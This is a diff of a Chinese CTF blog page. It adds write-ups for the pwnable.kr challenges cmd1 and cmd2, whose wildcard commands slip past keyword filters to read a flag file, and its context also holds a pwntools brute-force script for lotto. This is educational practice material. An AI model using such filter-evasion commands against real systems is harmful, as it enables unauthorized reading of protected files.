@@ -460,6 +460,8 @@ height:50vh;
 <h2 id="blackjack"><a href="#blackjack" class="headerlink" title="blackjack"></a>blackjack</h2><p>读代码不够仔细啊！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int betting() //Asks user amount to bet</span><br><span class="line">&#123;</span><br><span class="line"> printf(&quot;\n\nEnter Bet: $&quot;);</span><br><span class="line"> scanf(&quot;%d&quot;, &amp;bet);</span><br><span class="line"> </span><br><span class="line"> if (bet &gt; cash) //If player tries to bet more money than player has</span><br><span class="line"> &#123;</span><br><span class="line">        printf(&quot;\nYou cannot bet more money than you have.&quot;);</span><br><span class="line">        printf(&quot;\nEnter Bet: &quot;);</span><br><span class="line">        scanf(&quot;%d&quot;, &amp;bet);</span><br><span class="line">        return bet;</span><br><span class="line"> &#125;</span><br><span class="line"> else return bet;</span><br><span class="line">&#125; // End Function</span><br></pre></td></tr></table></figure></p>
 <p>这里只比较了一次if (bet &gt; cash),后续是没有比较的,先输入501，在输入一个很大的数，赢一次就可以了.</p>
 <h2 id="lotto"><a href="#lotto" class="headerlink" title="lotto"></a>lotto</h2><p>属于爆破的一个题目。<br>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">s= ssh(host=&apos;pwnable.kr&apos;,user=&apos;lotto&apos;,password=&apos;guest&apos;,port=2222)</span><br><span class="line">pro = s.process(&apos;/home/lotto/lotto&apos;)</span><br><span class="line">print pro.recv()</span><br><span class="line">pro.sendline(&apos;1&apos;)</span><br><span class="line">print pro.recv()</span><br><span class="line">str1 = chr(1)*6</span><br><span class="line">pro.sendline(str1)</span><br><span class="line">data= pro.recv()</span><br><span class="line">print data</span><br><span class="line">while 1:</span><br><span class="line">    pro.sendline(&apos;1&apos;)</span><br><span class="line">    print pro.recv()</span><br><span class="line">    pro.sendline(str1)</span><br><span class="line">    if pro.recv()!=data:</span><br><span class="line">        print pro.recv()</span><br><span class="line">        break</span><br></pre></td></tr></table></figure></p>
+<h2 id="cmd1"><a href="#cmd1" class="headerlink" title="cmd1"></a>cmd1</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cmd1 <span class="string">"/bin/cat f???"</span></span><br></pre></td></tr></table></figure>
+<h2 id="cmd2"><a href="#cmd2" class="headerlink" title="cmd2"></a>cmd2</h2><p>使用<code>command</code>命令<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cmd2 <span class="string">"command -p cat fla?"</span></span><br></pre></td></tr></table></figure></p>
 
     </article>
     <!-- license  -->
@@ -593,7 +595,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Jarvis"><span class="toc-number">1.</span> <span class="toc-text"><a href="#Jarvis" class="headerlink" title="Jarvis"></a>Jarvis</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#level0"><span class="toc-number">1.1.</span> <span class="toc-text"><a href="#level0" class="headerlink" title="level0"></a>level0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level1"><span class="toc-number">1.2.</span> <span class="toc-text"><a href="#level1" class="headerlink" title="level1"></a>level1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level2"><span class="toc-number">1.3.</span> <span class="toc-text"><a href="#level2" class="headerlink" title="level2"></a>level2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level2-x64"><span class="toc-number">1.4.</span> <span class="toc-text"><a href="#level2-x64" class="headerlink" title="level2_x64"></a>level2_x64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level3"><span class="toc-number">1.5.</span> <span class="toc-text"><a href="#level3" class="headerlink" title="level3"></a>level3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level3-x64"><span class="toc-number">1.6.</span> <span class="toc-text"><a href="#level3-x64" class="headerlink" title="level3_x64"></a>level3_x64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level4"><span class="toc-number">1.7.</span> <span class="toc-text"><a href="#level4" class="headerlink" title="level4"></a>level4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tell-me-something"><span class="toc-number">1.8.</span> <span class="toc-text"><a href="#tell-me-something" class="headerlink" title="tell me something"></a>tell me something</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#smashes"><span class="toc-number">1.9.</span> <span class="toc-text"><a href="#smashes" class="headerlink" title="smashes"></a>smashes</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwnable-kr"><span class="toc-number">2.</span> <span class="toc-text"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#bot"><span class="toc-number">2.1.</span> <span class="toc-text"><a href="#bot" class="headerlink" title="bot"></a>bot</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag"><span class="toc-number">2.2.</span> <span class="toc-text"><a href="#flag" class="headerlink" title="flag"></a>flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#passcode"><span class="toc-number">2.3.</span> <span class="toc-text"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#random"><span class="toc-number">2.4.</span> <span class="toc-text"><a href="#random" class="headerlink" title="random"></a>random</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#leg"><span class="toc-number">2.5.</span> <span class="toc-text"><a href="#leg" class="headerlink" title="leg"></a>leg</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mistake"><span class="toc-number">2.6.</span> <span class="toc-text"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellshock"><span class="toc-number">2.7.</span> <span class="toc-text"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#coin1"><span class="toc-number">2.8.</span> <span class="toc-text"><a href="#coin1" class="headerlink" title="coin1"></a>coin1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#blackjack"><span class="toc-number">2.9.</span> <span class="toc-text"><a href="#blackjack" class="headerlink" title="blackjack"></a>blackjack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lotto"><span class="toc-number">2.10.</span> <span class="toc-text"><a href="#lotto" class="headerlink" title="lotto"></a>lotto</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Jarvis"><span class="toc-number">1.</span> <span class="toc-text"><a href="#Jarvis" class="headerlink" title="Jarvis"></a>Jarvis</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#level0"><span class="toc-number">1.1.</span> <span class="toc-text"><a href="#level0" class="headerlink" title="level0"></a>level0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level1"><span class="toc-number">1.2.</span> <span class="toc-text"><a href="#level1" class="headerlink" title="level1"></a>level1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level2"><span class="toc-number">1.3.</span> <span class="toc-text"><a href="#level2" class="headerlink" title="level2"></a>level2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level2-x64"><span class="toc-number">1.4.</span> <span class="toc-text"><a href="#level2-x64" class="headerlink" title="level2_x64"></a>level2_x64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level3"><span class="toc-number">1.5.</span> <span class="toc-text"><a href="#level3" class="headerlink" title="level3"></a>level3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level3-x64"><span class="toc-number">1.6.</span> <span class="toc-text"><a href="#level3-x64" class="headerlink" title="level3_x64"></a>level3_x64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level4"><span class="toc-number">1.7.</span> <span class="toc-text"><a href="#level4" class="headerlink" title="level4"></a>level4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tell-me-something"><span class="toc-number">1.8.</span> <span class="toc-text"><a href="#tell-me-something" class="headerlink" title="tell me something"></a>tell me something</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#smashes"><span class="toc-number">1.9.</span> <span class="toc-text"><a href="#smashes" class="headerlink" title="smashes"></a>smashes</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwnable-kr"><span class="toc-number">2.</span> <span class="toc-text"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#bot"><span class="toc-number">2.1.</span> <span class="toc-text"><a href="#bot" class="headerlink" title="bot"></a>bot</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag"><span class="toc-number">2.2.</span> <span class="toc-text"><a href="#flag" class="headerlink" title="flag"></a>flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#passcode"><span class="toc-number">2.3.</span> <span class="toc-text"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#random"><span class="toc-number">2.4.</span> <span class="toc-text"><a href="#random" class="headerlink" title="random"></a>random</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#leg"><span class="toc-number">2.5.</span> <span class="toc-text"><a href="#leg" class="headerlink" title="leg"></a>leg</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mistake"><span class="toc-number">2.6.</span> <span class="toc-text"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellshock"><span class="toc-number">2.7.</span> <span class="toc-text"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#coin1"><span class="toc-number">2.8.</span> <span class="toc-text"><a href="#coin1" class="headerlink" title="coin1"></a>coin1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#blackjack"><span class="toc-number">2.9.</span> <span class="toc-text"><a href="#blackjack" class="headerlink" title="blackjack"></a>blackjack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lotto"><span class="toc-number">2.10.</span> <span class="toc-text"><a href="#lotto" class="headerlink" title="lotto"></a>lotto</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmd1"><span class="toc-number">2.11.</span> <span class="toc-text"><a href="#cmd1" class="headerlink" title="cmd1"></a>cmd1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmd2"><span class="toc-number">2.12.</span> <span class="toc-text"><a href="#cmd2" class="headerlink" title="cmd2"></a>cmd2</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -1585,7 +1587,90 @@ top:50vh;
     
     
     
-    <div class="total-archive"> Total : 65 </div>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-archive"> Total : 66 </div>
     
     <div class="post-archive">
     
@@ -1594,6 +1679,11 @@ top:50vh;
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/03</span><a class="archive-post-title" href= "/2018/11/03/Hitcon-Redo/" >Hitcon-Redo</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1943,45 +2033,45 @@ top:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="图像处理"><span class="iconfont-archer">&#xe606;</span>图像处理</span>
-    
         <span class="sidebar-tag-name" data-tags="笔记"><span class="iconfont-archer">&#xe606;</span>笔记</span>
-    
-        <span class="sidebar-tag-name" data-tags="crypto"><span class="iconfont-archer">&#xe606;</span>crypto</span>
-    
-        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
     
         <span class="sidebar-tag-name" data-tags="Reverse"><span class="iconfont-archer">&#xe606;</span>Reverse</span>
     
+        <span class="sidebar-tag-name" data-tags="crypto"><span class="iconfont-archer">&#xe606;</span>crypto</span>
+    
         <span class="sidebar-tag-name" data-tags="PWN"><span class="iconfont-archer">&#xe606;</span>PWN</span>
     
-        <span class="sidebar-tag-name" data-tags="Padding Orlace"><span class="iconfont-archer">&#xe606;</span>Padding Orlace</span>
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
     
-        <span class="sidebar-tag-name" data-tags="RC4,A5"><span class="iconfont-archer">&#xe606;</span>RC4,A5</span>
-    
-        <span class="sidebar-tag-name" data-tags="AES"><span class="iconfont-archer">&#xe606;</span>AES</span>
-    
-        <span class="sidebar-tag-name" data-tags="机器学习"><span class="iconfont-archer">&#xe606;</span>机器学习</span>
+        <span class="sidebar-tag-name" data-tags="图像处理"><span class="iconfont-archer">&#xe606;</span>图像处理</span>
     
         <span class="sidebar-tag-name" data-tags="DES"><span class="iconfont-archer">&#xe606;</span>DES</span>
     
-        <span class="sidebar-tag-name" data-tags="hello"><span class="iconfont-archer">&#xe606;</span>hello</span>
+        <span class="sidebar-tag-name" data-tags="机器学习"><span class="iconfont-archer">&#xe606;</span>机器学习</span>
     
-        <span class="sidebar-tag-name" data-tags="漏洞复现"><span class="iconfont-archer">&#xe606;</span>漏洞复现</span>
+        <span class="sidebar-tag-name" data-tags="RC4,A5"><span class="iconfont-archer">&#xe606;</span>RC4,A5</span>
+    
+        <span class="sidebar-tag-name" data-tags="hello"><span class="iconfont-archer">&#xe606;</span>hello</span>
     
         <span class="sidebar-tag-name" data-tags="Rsa"><span class="iconfont-archer">&#xe606;</span>Rsa</span>
     
+        <span class="sidebar-tag-name" data-tags="AES"><span class="iconfont-archer">&#xe606;</span>AES</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞复现"><span class="iconfont-archer">&#xe606;</span>漏洞复现</span>
+    
         <span class="sidebar-tag-name" data-tags="Vigenere"><span class="iconfont-archer">&#xe606;</span>Vigenere</span>
+    
+        <span class="sidebar-tag-name" data-tags="人类观察"><span class="iconfont-archer">&#xe606;</span>人类观察</span>
     
         <span class="sidebar-tag-name" data-tags="Web"><span class="iconfont-archer">&#xe606;</span>Web</span>
     
-        <span class="sidebar-tag-name" data-tags="人类观察"><span class="iconfont-archer">&#xe606;</span>人类观察</span>
+        <span class="sidebar-tag-name" data-tags="Padding Orlace"><span class="iconfont-archer">&#xe606;</span>Padding Orlace</span>
+    
+        <span class="sidebar-tag-name" data-tags="hash扩展攻击"><span class="iconfont-archer">&#xe606;</span>hash扩展攻击</span>
     
         <span class="sidebar-tag-name" data-tags="matplotlib"><span class="iconfont-archer">&#xe606;</span>matplotlib</span>
     
         <span class="sidebar-tag-name" data-tags="docker"><span class="iconfont-archer">&#xe606;</span>docker</span>
-    
-        <span class="sidebar-tag-name" data-tags="hash扩展攻击"><span class="iconfont-archer">&#xe606;</span>hash扩展攻击</span>
     
         <span class="sidebar-tag-name" data-tags="Python"><span class="iconfont-archer">&#xe606;</span>Python</span>
     
@@ -1991,15 +2081,15 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="root-me"><span class="iconfont-archer">&#xe606;</span>root-me</span>
     
-        <span class="sidebar-tag-name" data-tags="php审计"><span class="iconfont-archer">&#xe606;</span>php审计</span>
-    
         <span class="sidebar-tag-name" data-tags="sqli"><span class="iconfont-archer">&#xe606;</span>sqli</span>
     
         <span class="sidebar-tag-name" data-tags="vulnhub"><span class="iconfont-archer">&#xe606;</span>vulnhub</span>
     
-        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
-    
         <span class="sidebar-tag-name" data-tags="仿射加密"><span class="iconfont-archer">&#xe606;</span>仿射加密</span>
+    
+        <span class="sidebar-tag-name" data-tags="php审计"><span class="iconfont-archer">&#xe606;</span>php审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
     
         <span class="sidebar-tag-name" data-tags="无产阶级之怒"><span class="iconfont-archer">&#xe606;</span>无产阶级之怒</span>
     
@@ -2038,29 +2128,29 @@ jsonContent:
         <div class="sidebar-panel-categories">
     <div class="sidebar-categories-name">
     
-        <span class="sidebar-category-name" data-categories="图像处理"><span class="iconfont-archer">&#xe60a;</span>图像处理</span>
-    
         <span class="sidebar-category-name" data-categories="笔记"><span class="iconfont-archer">&#xe60a;</span>笔记</span>
-    
-        <span class="sidebar-category-name" data-categories="writeup"><span class="iconfont-archer">&#xe60a;</span>writeup</span>
     
         <span class="sidebar-category-name" data-categories="Writeup"><span class="iconfont-archer">&#xe60a;</span>Writeup</span>
     
         <span class="sidebar-category-name" data-categories="PWN"><span class="iconfont-archer">&#xe60a;</span>PWN</span>
     
+        <span class="sidebar-category-name" data-categories="writeup"><span class="iconfont-archer">&#xe60a;</span>writeup</span>
+    
+        <span class="sidebar-category-name" data-categories="图像处理"><span class="iconfont-archer">&#xe60a;</span>图像处理</span>
+    
         <span class="sidebar-category-name" data-categories="Crypto"><span class="iconfont-archer">&#xe60a;</span>Crypto</span>
     
         <span class="sidebar-category-name" data-categories="机器学习"><span class="iconfont-archer">&#xe60a;</span>机器学习</span>
     
+        <span class="sidebar-category-name" data-categories="Writeup/Crypto"><span class="iconfont-archer">&#xe60a;</span>Writeup/Crypto</span>
+    
         <span class="sidebar-category-name" data-categories="漏洞复现"><span class="iconfont-archer">&#xe60a;</span>漏洞复现</span>
     
-        <span class="sidebar-category-name" data-categories="Writeup/Crypto"><span class="iconfont-archer">&#xe60a;</span>Writeup/Crypto</span>
+        <span class="sidebar-category-name" data-categories="Web"><span class="iconfont-archer">&#xe60a;</span>Web</span>
     
         <span class="sidebar-category-name" data-categories="matplotlib"><span class="iconfont-archer">&#xe60a;</span>matplotlib</span>
     
         <span class="sidebar-category-name" data-categories="docker"><span class="iconfont-archer">&#xe60a;</span>docker</span>
-    
-        <span class="sidebar-category-name" data-categories="Web"><span class="iconfont-archer">&#xe60a;</span>Web</span>
     
         <span class="sidebar-category-name" data-categories="Python"><span class="iconfont-archer">&#xe60a;</span>Python</span>
     
